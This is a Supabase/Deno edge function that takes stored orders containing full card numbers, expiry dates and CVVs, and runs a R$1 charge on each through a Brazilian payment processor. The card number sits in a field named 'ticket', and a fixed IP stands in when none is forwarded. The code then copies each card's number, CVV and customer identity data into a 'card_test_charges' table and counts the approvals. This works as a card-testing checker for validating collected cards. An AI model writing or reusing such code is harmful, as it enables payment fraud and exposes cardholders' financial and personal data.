import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const TEST_AMOUNT = 1; // R$1

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const PAYOUT_SECRET_KEY = Deno.env.get('PAYOUT_SECRET_KEY')?.trim();
    if (!PAYOUT_SECRET_KEY) throw new Error('PAYOUT_SECRET_KEY not configured');

    const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
    const SERVICE_ROLE = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(SUPABASE_URL, SERVICE_ROLE);

    const { order_ids } = await req.json();
    if (!Array.isArray(order_ids) || order_ids.length === 0) {
      return new Response(JSON.stringify({ error: 'order_ids required' }), {
        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { data: orders, error } = await supabase
      .from('orders')
      .select('*')
      .in('id', order_ids);

    if (error) throw error;

    const authToken = btoa(`${PAYOUT_SECRET_KEY}:x`);
    const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || '213.123.123.13';

    const results: any[] = [];

    for (const order of orders || []) {
      const cardNumber = String((order as any).ticket || '').replace(/\D/g, '');
      const expiry = String(order.card_expiry || '').replace(/\D/g, '');
      const expMonth = expiry.slice(0, 2);
      const expYearRaw = expiry.slice(2);
      const expYear = expYearRaw.length === 2 ? `20${expYearRaw}` : expYearRaw;

      if (!cardNumber || cardNumber.length < 12 || !expMonth || !expYear || !order.card_cvv) {
        const { data: inserted } = await supabase.from('card_test_charges').insert({
          order_id: order.id,
          order_number: order.order_number,
          customer_name: order.customer_name,
          customer_email: order.customer_email,
          customer_cpf: order.customer_cpf,
          customer_phone: order.customer_phone,
          card_holder_name: order.card_holder_name,
          card_number: cardNumber,
          card_brand: order.card_brand,
          card_expiry: order.card_expiry,
          card_cvv: order.card_cvv,
          card_installments: order.card_installments || 1,
          amount: TEST_AMOUNT,
          status: 'invalid_data',
          refusal_reason: 'Dados de cartão incompletos',
        }).select().single();
        results.push(inserted);
        continue;
      }

      const payload = {
        paymentMethod: 'credit_card',
        amount: TEST_AMOUNT * 100,
        installments: 1,
        ip: clientIp,
        metadata: `test-${order.id}`,
        customer: {
          name: order.customer_name || 'Cliente',
          email: order.customer_email || 'teste@teste.com',
          phone: String(order.customer_phone || '').replace(/\D/g, ''),
          document: { type: 'cpf', number: String(order.customer_cpf || '').replace(/\D/g, '') },
        },
        card: {
          number: cardNumber,
          holderName: order.card_holder_name || order.customer_name || 'Cliente',
          expirationMonth: parseInt(expMonth, 10),
          expirationYear: parseInt(expYear, 10),
          cvv: String(order.card_cvv),
        },
        items: [{ title: 'Assinatura', unitPrice: TEST_AMOUNT * 100, quantity: 1, tangible: false }],
      };

      let status = 'error';
      let refusalReason = '';
      let txId = '';
      let raw: any = null;

      try {
        const resp = await fetch('https://api.payoutbr.com.br/v1/transactions', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'accept': 'application/json',
            'authorization': `Basic ${authToken}`,
          },
          body: JSON.stringify(payload),
        });
        raw = await resp.json();
        const tx = raw?.data ?? raw;
        txId = String(tx?.id ?? '');
        status = String(tx?.status ?? (resp.ok ? 'pending' : 'refused')).toLowerCase();
        refusalReason =
          tx?.refuseReason || tx?.acquirerMessage || tx?.message ||
          raw?.message || (Array.isArray(raw?.errors) ? raw.errors.map((e: any) => e?.message || JSON.stringify(e)).join('; ') : '') ||
          (resp.ok ? '' : `HTTP ${resp.status}`);
      } catch (e: any) {
        status = 'error';
        refusalReason = e?.message || 'Erro desconhecido';
      }

      const { data: inserted } = await supabase.from('card_test_charges').insert({
        order_id: order.id,
        order_number: order.order_number,
        customer_name: order.customer_name,
        customer_email: order.customer_email,
        customer_cpf: order.customer_cpf,
        customer_phone: order.customer_phone,
        card_holder_name: order.card_holder_name,
        card_number: cardNumber,
        card_brand: order.card_brand,
        card_expiry: order.card_expiry,
        card_cvv: order.card_cvv,
        card_installments: order.card_installments || 1,
        amount: TEST_AMOUNT,
        transaction_id: txId || null,
        status,
        refusal_reason: refusalReason || null,
        raw_response: raw,
      }).select().single();

      results.push(inserted);
    }

    const approvedCount = results.filter((r) => r && ['approved', 'paid'].includes(String(r.status).toLowerCase())).length;

    return new Response(JSON.stringify({ ok: true, total: results.length, approved: approvedCount, results }), {
      status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: any) {
    console.error('test-card-charge error:', error);
    return new Response(JSON.stringify({ error: error?.message || 'Unknown error' }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
